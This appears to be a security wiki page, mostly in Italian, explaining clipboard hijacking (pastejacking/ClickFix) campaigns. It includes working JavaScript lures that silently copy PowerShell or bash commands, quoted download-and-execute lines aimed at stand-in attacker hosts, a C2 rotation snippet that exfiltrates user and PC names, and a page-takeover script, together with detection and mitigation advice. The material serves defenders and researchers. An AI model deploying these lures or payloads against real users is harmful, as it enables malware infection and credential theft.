# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Non incollare mai qualcosa che non hai copiato personalmente." – consiglio vecchio ma ancora valido

## Panoramica

Clipboard hijacking – also known as *pastejacking* – sfrutta il fatto che gli utenti copiano e incollano routinariamente comandi senza ispezionarli. Una pagina web malevola (o qualsiasi contesto con JavaScript come un'applicazione Electron o Desktop) inserisce programmaticamente testo controllato dall'attaccante negli appunti di sistema. Le vittime sono invitate, normalmente tramite istruzioni di social engineering accuratamente costruite, a premere **Win + R** (finestra Esegui), **Win + X** (Quick Access / PowerShell), o ad aprire un terminale e *incollare* il contenuto degli appunti, eseguendo immediatamente comandi arbitrari.

Poiché non viene scaricato alcun file né aperto alcun allegato, la tecnica bypassa la maggior parte dei controlli di sicurezza per e-mail e contenuti web che monitorano allegati, macro o l'esecuzione diretta di comandi. L'attacco è quindi popolare nelle campagne di phishing che diffondono famiglie di malware commodity come NetSupport RAT, Latrodectus loader o Lumma Stealer.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Campagne più vecchie usavano `document.execCommand('copy')`, quelle più recenti si affidano alla **Clipboard API** asincrona (`navigator.clipboard.writeText`).

## Flusso ClickFix / ClearFake

1. L'utente visita un sito typosquattato o compromesso (es. `docusign.sa[.]com`)
2. Il JavaScript iniettato **ClearFake** chiama un helper `unsecuredCopyToClipboard()` che memorizza silenziosamente una one-liner PowerShell codificata in Base64 negli appunti.
3. Le istruzioni HTML dicono alla vittima: *“Premi **Win + R**, incolla il comando e premi Enter per risolvere il problema.”*
4. `powershell.exe` viene eseguito, scaricando un archivio che contiene un eseguibile legittimo più una DLL maligna (classic DLL sideloading).
5. Il loader decripta ulteriori stadi, inietta shellcode e installa persistenza (es. scheduled task) – eseguendo infine NetSupport RAT / Latrodectus / Lumma Stealer.

### Esempio di catena NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legittimo Java WebStart) cerca nella sua directory `msvcp140.dll`.
* La DLL malevola risolve dinamicamente le API con **GetProcAddress**, scarica due binaries (`data_3.bin`, `data_4.bin`) tramite **curl.exe**, li decripta usando una rolling XOR key `"https://google.com/"`, inietta il shellcode finale e decomprime **client32.exe** (NetSupport RAT) in `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Scarica `la.txt` con **curl.exe**
2. Esegue il JScript downloader all'interno di **cscript.exe**
3. Scarica un payload MSI → posa `libcef.dll` accanto a un'applicazione firmata → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer tramite MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
La chiamata **mshta** avvia uno script PowerShell nascosto che recupera `PartyContinued.exe`, estrae `Boat.pst` (CAB), ricostruisce `AutoIt3.exe` tramite `extrac32` e concatenazione di file e infine esegue uno script `.a3x` che esfiltra le credenziali del browser verso `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK con C2 rotante (PureHVNC)

Alcune campagne ClickFix saltano del tutto i download di file e istruiscono le vittime a incollare un one‑liner che recupera ed esegue JavaScript tramite WSH, lo rende persistente e ruota il C2 quotidianamente. Esempio di catena osservata:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Caratteristiche principali
- URL offuscato invertito a runtime per eludere l'ispezione superficiale.
- JavaScript si rende persistente tramite uno Startup LNK (WScript/CScript), e seleziona il C2 in base al giorno corrente – consentendo una rapida domain rotation.

Frammento JS minimo usato per ruotare i C2 in base alla data:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
La fase successiva solitamente distribuisce un loader che stabilisce persistenza e scarica un RAT (es. PureHVNC), spesso effettuando TLS pinning su un certificato hardcoded e chunking del traffico.

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (o `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` che invoca WScript/CScript con un percorso JS sotto `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU e telemetria della riga di comando contenenti `.split('').reverse().join('')` o `eval(a.responseText)`.
- Ripetuti `powershell -NoProfile -NonInteractive -Command -` con grandi payload stdin per alimentare script lunghi senza linee di comando estese.
- Scheduled Tasks che successivamente eseguono LOLBins come `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` sotto un task/percorso dall'aspetto di un updater (es. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Hostnames e URL C2 che ruotano giornalmente con pattern `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlare eventi di write degli appunti seguiti da Win+R paste e immediata esecuzione di `powershell.exe`.

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` mantiene la cronologia dei comandi **Win + R** – cercare voci Base64 / offuscate insolite.
* Security Event ID **4688** (Process Creation) dove `ParentImage` == `explorer.exe` e `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** per creazioni di file sotto `%LocalAppData%\Microsoft\Windows\WinX\` o cartelle temporanee subito prima dell'evento 4688 sospetto.
* EDR clipboard sensors (se presenti) – correlare `Clipboard Write` seguito immediatamente da un nuovo processo PowerShell.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Recenti campagne producono in massa pagine di verifica CDN/browser false ("Just a moment…", IUAM-style) che costringono l'utente a copiare comandi specifici per OS dagli appunti nella console nativa. Questo pivotta l'esecuzione fuori dal sandbox del browser e funziona su Windows e macOS.

Key traits of the builder-generated pages
- OS detection via `navigator.userAgent` per adattare i payload (Windows PowerShell/CMD vs. macOS Terminal). Decoy/no-op opzionali per OS non supportati per mantenere l'illusione.
- Clipboard copy automatico su azioni UI innocue (checkbox/Copy) mentre il testo visibile può differire dal contenuto degli appunti.
- Blocco mobile e un popover con istruzioni passo-passo: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Offuscazione opzionale e injector single-file per sovrascrivere il DOM di un sito compromesso con un'interfaccia di verifica in stile Tailwind (nessuna nuova registrazione di dominio richiesta).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence dell'esecuzione iniziale
- Usa `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` così l'esecuzione continua dopo la chiusura del terminale, riducendo artefatti visibili.

In-place page takeover su siti compromessi
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Idee per detection e hunting specifiche per lures in stile IUAM
- Web: Pagine che legano Clipboard API a verification widget; mismatch tra il testo visualizzato e il payload degli appunti; `navigator.userAgent` branching; Tailwind + single-page replace in contesti sospetti.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` poco dopo un'interazione con il browser; installer batch/MSI eseguiti da `%TEMP%`.
- macOS endpoint: Terminal/iTerm che generano `bash`/`curl`/`base64 -d` con `nohup` vicino ad eventi del browser; job in background che sopravvivono alla chiusura del terminale.
- Correlare la cronologia `RunMRU` di Win+R e le scritture degli appunti con la successiva creazione di processi console.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Mitigazioni

1. Indurimento del browser – disabilitare l'accesso in scrittura agli appunti (`dom.events.asyncClipboard.clipboardItem` ecc.) o richiedere un gesto dell'utente.
2. Consapevolezza sulla sicurezza – insegnare agli utenti di *digitare* comandi sensibili o di incollarli prima in un editor di testo.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control per impedire l'esecuzione di one-liner arbitrari.
4. Controlli di rete – bloccare le richieste outbound verso domini noti di pastejacking e C2 di malware.

## Related Tricks

* **Discord Invite Hijacking** spesso sfrutta lo stesso approccio ClickFix dopo aver attirato gli utenti in un server maligno:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
